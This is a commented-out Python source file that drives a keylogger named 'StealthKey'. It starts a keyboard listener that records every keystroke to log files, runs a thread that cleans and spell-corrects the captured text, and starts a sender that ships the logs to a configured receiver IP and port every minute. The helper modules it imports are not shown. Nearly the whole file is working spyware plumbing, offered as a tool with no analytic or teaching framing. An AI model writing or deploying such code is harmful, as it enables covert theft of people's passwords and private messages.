# from pynput.keyboard import Listener
# import threading
# import os
# import time

# from stealthkey import write_to_file, on_release
# from text_cleaner import clean_special_keys
# from spell_corrector import correct_text
# from log_creator import start_log_creator
# from sender import start_sender

# # Configuration for sender
# RECEIVER_IP = "192.168.1.100"  # Change to receiver's IP
# RECEIVER_PORT = 5555
# LOGS_FOLDER = "logs"
# CHECK_INTERVAL = 60

# def get_current_log_file():
#     """Get the current log file from log_creator"""
#     return os.path.join(LOGS_FOLDER, [f for f in os.listdir(LOGS_FOLDER) if f.startswith("log_")][-1]) if os.path.exists(LOGS_FOLDER) and os.listdir(LOGS_FOLDER) else None

# def periodic_cleaner(log_creator):
#     """Clean and correct log content periodically"""
#     while True:
#         try:
#             current_log = log_creator.get_current_log_file()
            
#             if current_log and os.path.exists(current_log):
#                 with open(current_log, "r", encoding="utf-8") as file:
#                     content = file.read()
                
#                 cleaned_content = clean_special_keys(content)
#                 corrected_content = correct_text(cleaned_content)
                
#                 with open(current_log, "w", encoding="utf-8") as file:
#                     file.write(corrected_content)
            
#             time.sleep(5)
#         except Exception as e:
#             print(f"Error in periodic_cleaner: {e}")
#             time.sleep(5)

# if __name__ == "__main__":
#     print("Starting integrated StealthKey workflow with logging and sending...")
    
#     # Start log creator
#     log_creator = start_log_creator(LOGS_FOLDER)
#     print(f"Log creator started. Logs folder: {LOGS_FOLDER}")
    
#     # Start sender
#     sender = start_sender(RECEIVER_IP, RECEIVER_PORT, LOGS_FOLDER, CHECK_INTERVAL)
#     print(f"Sender started. Target: {RECEIVER_IP}:{RECEIVER_PORT}")
    
#     # Start StealthKey listener
#     listener = Listener(on_press=write_to_file, on_release=on_release)
#     listener.start()
#     print("StealthKey listener started")
    
#     # Start cleaning thread
#     cleaning_thread = threading.Thread(target=periodic_cleaner, args=(log_creator,), daemon=True)
#     cleaning_thread.start()
    
#     print("System running. Press ESC to stop.")
#     listener.join()
